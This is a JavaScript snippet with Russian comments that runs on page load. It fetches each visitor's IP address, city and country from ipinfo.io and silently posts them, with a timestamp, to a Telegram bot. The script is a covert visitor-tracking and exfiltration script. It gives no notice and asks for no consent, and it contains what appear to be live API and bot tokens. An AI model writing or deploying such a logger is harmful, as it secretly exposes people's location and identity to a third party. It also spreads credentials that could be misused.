window.onload = function() {
    // Получаем данные пользователя (например, IP и геолокацию)
    fetch('https://ipinfo.io/json?token=c0c78c76ac0ca3')  // Замените на ваш токен для получения IP
        .then(response => response.json())
        .then(data => {
            // Отправляем эти данные в бот или на сервер
            fetch('https://api.telegram.org/bot7722533303:AAFw7FfOgT8V1mrc07TY_PLIbeIvwFBuUI?chat_id=1163463444&text=<'+data.ip+' '+data.city+' '+data.country+'>', {  // Адрес для отправки данных в бота
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    ip: data.ip,
                    location: data.city,  // Геолокация
                    country: data.country, // Страна
                    time: new Date().toISOString(),  // Время
                }),
            })
            .then(response => response.json())
            .then(result => console.log('Данные отправлены в бот'))
            .catch(error => console.error('Ошибка при отправке данных:', error));
        })
        .catch(error => console.error('Не удалось получить IP:', error));
};
